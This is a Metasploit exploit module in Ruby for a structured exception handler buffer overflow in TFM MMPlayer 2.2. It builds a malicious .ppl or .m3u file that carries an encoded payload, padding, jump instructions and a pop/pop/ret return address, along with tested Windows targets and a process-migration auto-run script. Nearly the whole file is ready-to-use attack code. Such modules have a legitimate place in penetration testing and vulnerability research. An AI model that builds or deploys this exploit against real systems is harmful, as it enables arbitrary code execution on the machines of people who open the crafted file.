# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;TFM MMPlayer (m3u/ppl File) Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a buffer overflow in MMPlayer 2.2
                The vulnerability is triggered when opening a malformed M3U/PPL file
                that contains an overly long string, which results in overwriting a
                SEH record, thus allowing arbitrary code execution under the context
                of the user.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;RjRjh Hack3r&#039;,                        # Original discovery and exploit
                    &#039;Brendan Coles <bcoles[at]gmail.com>&#039;  # msf exploit
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;OSVDB&#039;, &#039;80532&#039; ],
                    [ &#039;BID&#039;, &#039;52698&#039; ],
                    [ &#039;EDB&#039;, &#039;18656&#039; ], # .m3u
                    [ &#039;EDB&#039;, &#039;18657&#039; ]  # .ppl
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;ExitFunction&#039; => &#039;seh&#039;,
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    # Tested on:
                    # Windows XP Pro SP3 - English
                    # Windows Vista SP1 - English
                    # Windows 7 Home Basic SP0 - English
                    # Windows 7 Ultimate SP1 - English
                    # Windows Server 2003 Enterprise SP2 - English
                    [ &#039;Windows Universal&#039;, { &#039;Ret&#039; => 0x00401390 } ], # p/p/r -> MMPlayer.exe
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;Size&#039; => 4000,
                    &#039;BadChars&#039; => "\x00\x0a\x0d",
                    &#039;DisableNops&#039; => false
                },
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Mar 23 2012&#039;,
            &#039;DefaultTarget&#039;  => 0
        ))
 
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;, &#039;msf.ppl&#039;])
            ], self.class)
 
    end
 
    def exploit
 
        nops   = make_nops(10)
        sc     = payload.encoded
        offset = Rex::Text.rand_text_alphanumeric(4103 - sc.length - nops.length)
        jmp    = Rex::Arch::X86.jmp(-4108)            # near jump 4103 bytes
        nseh   = Rex::Arch::X86.jmp_short(-7)         # jmp back 7 bytes
        nseh  << Rex::Text.rand_text_alphanumeric(2)
        seh    = [target.ret].pack(&#039;V&#039;)
 
        sploit  = nops
        sploit << sc
        sploit << offset
        sploit << jmp
        sploit << nseh
        sploit << seh
 
        # write file
        file_create(sploit)
 
    end
end



